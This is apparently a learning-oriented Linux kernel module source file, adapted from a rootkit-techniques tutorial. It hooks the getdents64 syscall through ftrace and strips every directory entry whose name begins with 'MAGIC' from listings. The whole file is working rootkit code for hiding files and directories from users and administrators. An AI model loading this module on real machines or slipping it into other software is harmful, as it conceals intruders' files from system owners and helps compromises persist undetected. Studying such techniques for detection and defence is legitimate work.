/**
 * This module aims to implement base logic for hiding directory hooking linked syscalls (getdents64 & getdents)
 * 
 * Sources : 
 * https://github.com/xcellerator/linux_kernel_hacking/blob/master/3_RootkitTechniques/3.4_hiding_directories/rootkit.c
 * https://syscalls64.paolostivanin.com/
 * 
 * Notes : 
 * This module focus only on kernel version > 4.17.0 for the the test using new pt_regs structs.
 * 
 * @author Yekuuun
 */
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/dirent.h>
#include <linux/string.h>

#define MODNAME       "HIDE_DIR"
#define MAGIC_PREFIX  "MAGIC"

#include "../lib/hook/ftrace_helper.h"

MODULE_AUTHOR("Yekuuun");
MODULE_DESCRIPTION("Hiding directories.");
MODULE_LICENSE("GPL");
MODULE_VERSION("0.0.1");

static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);

static asmlinkage long hook_getdents64(const struct pt_regs *regs){
    long err;
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    int size_ret = orig_getdents64(regs);
    if(size_ret <= 0)
        return size_ret;

    dirent_ker = kzalloc(size_ret, GFP_KERNEL);
    if(!dirent_ker)
        return size_ret;

    err = copy_from_user(dirent_ker, dirent, size_ret);
    if(err)
        goto __ERR_HOOK_GETDENTS64;

    while(offset < size_ret){
        current_dir = (void *)dirent_ker + offset;

        if(strncmp(MAGIC_PREFIX, current_dir->d_name, strlen(MAGIC_PREFIX)) == 0){
            if(current_dir == dirent_ker) {
                size_ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, size_ret);
                continue;
            }

            previous_dir->d_reclen += current_dir->d_reclen;
        } 
        else {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    err = copy_to_user(dirent, dirent_ker, size_ret);

__ERR_HOOK_GETDENTS64:
    if(dirent_ker)
        kfree(dirent_ker);

    return size_ret;
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
};

static int __init hide_lkm_init(void) {
#if !defined(CONFIG_X86_64) || (LINUX_VERSION_CODE < KERNEL_VERSION(4,17,0))
    pr_err("[!] Unsupported kernel version or architecture.\n");
    return -EINVAL;
#endif
    int err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    pr_info("[+] %s loaded.\n", MODNAME);
    return 0;
}

static void __exit hide_lkm_exit(void){
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    pr_info("[-] %s unloaded.\n", MODNAME);
}

module_init(hide_lkm_init);
module_exit(hide_lkm_exit);